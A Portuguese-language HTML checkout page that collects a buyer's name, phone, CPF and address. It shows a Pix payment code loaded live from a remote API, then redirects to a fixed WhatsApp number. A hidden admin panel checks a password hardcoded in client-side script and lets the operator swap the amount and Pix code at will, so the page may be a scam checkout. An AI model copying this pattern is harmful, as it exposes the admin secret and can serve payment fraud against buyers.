<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Pagamento via Pix</title>

<style>
body{margin:0;font-family:system-ui;background:#f2f2f2}
.hidden{display:none}
.top{background:#2db36c;color:#fff;padding:30px 20px;text-align:center}
.icon{width:80px;height:80px;border-radius:50%;background:#fff;margin:0 auto 15px;display:grid;place-items:center;font-size:36px}
.card{background:#fff;border-radius:12px;padding:20px;margin:20px;box-shadow:0 10px 25px rgba(0,0,0,.1)}
input,textarea,button{width:100%;padding:12px;margin-top:10px;font-size:14px}
button{border:0;border-radius:8px;background:#1c9bd6;color:#fff;cursor:pointer}
.code{background:#f4f4f4;padding:12px;border-radius:6px;font-size:12px;word-break:break-all}
.modal{position:fixed;inset:0;background:rgba(0,0,0,.45);display:none;place-items:center;z-index:10}
.modal .box{background:#fff;border-radius:12px;padding:20px;max-width:340px;text-align:center}
.modal ol{padding-left:18px;text-align:left;font-size:14px}
.admin{max-width:420px;margin:40px auto;background:#fff;padding:20px;border-radius:12px}
</style>
</head>

<body>

<!-- FORMUL√ÅRIO -->
<div id="formulario">
  <div class="top">
    <div class="icon">üõçÔ∏è</div>
    <h2>Dados para entrega</h2>
    <p>Preencha corretamente para continuar</p>
  </div>

  <div class="card">
    <input id="nome" placeholder="Nome completo">
    <input id="telefone" placeholder="Telefone (WhatsApp)">
    <input id="cpf" placeholder="CPF">
    <input id="cep" placeholder="CEP">
    <input id="estado" placeholder="Estado">
    <input id="cidade" placeholder="Cidade">
    <input id="endereco" placeholder="Endere√ßo completo">
    <button onclick="continuar()">Continuar</button>
  </div>
</div>

<!-- PIX -->
<div id="pix" class="hidden">
  <div class="top">
    <div class="icon">üí≥</div>
    <h2 id="titulo">Falta pouco!</h2>
    <p id="subtitulo">Copie e cole o c√≥digo Pix no seu app banc√°rio</p>
  </div>

  <div class="card">
    <div style="color:#555;font-size:14px">Valor do Pix:</div>
    <div id="valor" style="font-size:22px;font-weight:700;margin:6px 0"></div>

    <div style="color:#555;font-size:14px;margin-top:10px">C√≥digo Pix (Copia e Cola):</div>
    <div class="code" id="codigo"></div>

    <button onclick="copiar()">Copiar c√≥digo</button>
    <p id="validade" style="font-size:12px;color:#777;margin-top:6px"></p>
  </div>
</div>

<!-- MODAL INSTRU√á√ïES -->
<div class="modal" id="modal">
  <div class="box">
    <h3>Voc√™ copiou o c√≥digo!</h3>
    <p>Agora siga os passos abaixo:</p>

    <ol>
      <li>Abra o app do seu banco</li>
      <li>Escolha a op√ß√£o <strong>Pagar com Pix</strong></li>
      <li>Cole o c√≥digo copiado</li>
      <li>Confirme o pagamento</li>
    </ol>

    <button onclick="irWhatsapp()">Entendi</button>
  </div>
</div>

<!-- ADMIN -->
<div id="admin" class="admin hidden">
  <h3>Painel Admin</h3>
  <input id="a_titulo" placeholder="T√≠tulo">
  <input id="a_subtitulo" placeholder="Subt√≠tulo">
  <input id="a_valor" placeholder="Valor">
  <textarea id="a_codigo" placeholder="C√≥digo Pix"></textarea>
  <input id="a_validade" placeholder="Texto validade">
  <button onclick="salvarAdmin()">Salvar altera√ß√µes</button>
</div>

<script>
const API='https://pix-site-api.onrender.com/api/pix';
const SENHA='001533';
let CLIENTE={};
let PIX='';

async function carregar(){
  const r=await fetch(API,{cache:'no-store'});
  const d=await r.json();
  titulo.innerText=d.titulo;
  subtitulo.innerText=d.subtitulo;
  valor.innerText=d.valor;
  codigo.innerText=d.codigo;
  validade.innerText=d.validade;
  PIX=d.codigo;

  a_titulo.value=d.titulo;
  a_subtitulo.value=d.subtitulo;
  a_valor.value=d.valor;
  a_codigo.value=d.codigo;
  a_validade.value=d.validade;
}
carregar();
setInterval(carregar,5000);

function continuar(){
  const campos=[nome,telefone,cpf,cep,estado,cidade,endereco];
  if(campos.some(c=>!c.value.trim())){
    alert('Preencha todos os campos');
    return;
  }
  CLIENTE={
    nome:nome.value,
    telefone:telefone.value,
    endereco:`${endereco.value}, ${cidade.value}-${estado.value}`
  };
  formulario.classList.add('hidden');
  pix.classList.remove('hidden');
}

function copiar(){
  navigator.clipboard.writeText(PIX).then(()=>{
    modal.style.display='grid';
  });
}

function irWhatsapp(){
  modal.style.display='none';
  const msg=`Ol√°! Realizei um pedido no site.

Nome: ${CLIENTE.nome}
Telefone: ${CLIENTE.telefone}
Endere√ßo: ${CLIENTE.endereco}

Valor do Pix: ${valor.innerText}`;
  window.location.href=`https://wa.me/5516997867250?text=${encodeURIComponent(msg)}`;
}

if(location.search.includes('adminhkchef')){
  const s=prompt('Senha admin:');
  if(s===SENHA){
    admin.classList.remove('hidden');
    formulario.classList.add('hidden');
    pix.classList.add('hidden');
  }
}

async function salvarAdmin(){
  await fetch(API,{
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({
      senha:SENHA,
      dados:{
        titulo:a_titulo.value,
        subtitulo:a_subtitulo.value,
        valor:a_valor.value,
        codigo:a_codigo.value,
        validade:a_validade.value
      }
    })
  });
  alert('Atualizado com sucesso');
}
</script>

</body>
</html>
